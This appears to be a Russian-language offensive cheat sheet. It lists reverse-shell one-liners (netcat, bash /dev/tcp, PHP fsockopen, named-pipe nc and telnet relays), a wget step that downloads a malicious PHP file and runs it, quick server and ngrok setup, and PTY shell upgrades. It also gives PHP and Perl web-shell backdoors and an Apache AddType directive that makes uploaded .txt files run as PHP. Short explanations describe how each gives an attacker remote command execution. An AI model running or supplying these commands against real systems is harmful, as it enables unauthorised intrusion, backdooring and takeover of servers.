# Сreat conect

слушать порт:
```bash
nc -lvnp {port}
```
подключиться к прослушиваемому порту:
или
```bash
nc -e /bin/sh {IP} {port}
```
или
```bash
bash -i >& /dev/tcp/{IP}/{port} 0>&1
```
```shell
/bin/bash -i > /dev/tcp/{IP}/{port} 0<&1 2>&1
```
```sh
sh -i >& /dev/tcp/{IP}/{port} 0>&1
```
или
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/{your_listeniing_port} 0>&1"
```
или
```php
php -r '$sock=fsockopen({ip},{port});exec("/bin/sh -i <&3 >&3 2>&3");'
```
или 
```shell 
mknod backpipe p; nc {IP} {port} 0<backpipe | /bin/bash 1>backpipe
```
* Создаётся именованный канал (pipe) с именем `backpipe`. Далее, с помощью `nc` устанавливается соединение с атакующим сервером. `stdin` берется из этого канала, а вывод командного интерпретатора `/bin/bash` направляется обратно в этот же канал. Это способ организовать двустороннюю связь через именованный канал.
```shell
mknod backpipe p; telnet {IP} {port} 0<backpipe | /bin/bash 1>backpipe
```
* Аналогичная первой команде с использованием `telnet` вместо `nc`. Также создается именованный канал для передачи команд между атакующим и жертвой.
или 
``` shell
telnet {IP} {1st_port} | /bin/bash | telnet {IP} {2nd_port}
```
* Устанавливается два telnet-соединения с атакующим сервером на двух разных портах (`<1st_port>` и `<2nd_port>`). Через эти соединения передается ввод и вывод командного интерпретатора.
или 
``` shell
wget -O /tmp/bd.php <url_to_malicious_file> && php -f /tmp/bd.php
```
- Команда скачивает вредоносный файл (обычно это PHP-скрипт) с указанного URL и сохраняет его в директорию `/tmp` под именем `bd.php`. Затем с помощью PHP запускается этот файл, что может позволить удаленному серверу выполнять произвольные команды на целевой машине.
# Create server
php
```bash
php -S {ip}:{port}
```
python
```bash
python3 -m http.server {port}
```
ngrok
```bash
// в одном терминале сначала поднимается сервер
php -S 127.0.0.1:1234
```

```bash
// в другом ngrok
ngrok http 9001
```
# Upadate shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

# Backdoors

**`<?php passthru($_REQUEST['c']) ?>`**:

- Этот PHP-код принимает параметр `c` из запроса (`$_REQUEST['c']`) и передает его в функцию `passthru()`.
- Функция `passthru()` выполняет переданную команду в системе и выводит результат. Таким образом, злоумышленник может выполнить любую команду на сервере, указав её в параметре `c` URL-запроса.
или
```PHP
my @cmd = `$req`; foreach my $line (@cmd) { print $line . "<br/>"; }
```
- Он выполняет команду, переданную через переменную `$req`, и сохраняет результат выполнения в массив `@cmd`. Далее цикл `foreach` выводит каждую строку результата через `print`, добавляя HTML-тег `<br/>` для переноса строк.
- Аналогично предыдущему примеру, этот код позволяет выполнять произвольные команды на сервере и возвращать результат через веб-страницу.
или
**`AddType application/x-httpd-php .txt`**:

- Эта директива предназначена для настройки веб-сервера Apache. Она указывает, что файлы с расширением `.txt` должны обрабатываться как PHP-скрипты.
- В результате злоумышленник может загружать текстовые файлы с вредоносным PHP-кодом на сервер, которые будут исполняться как PHP, обходя стандартные ограничения по типам файлов.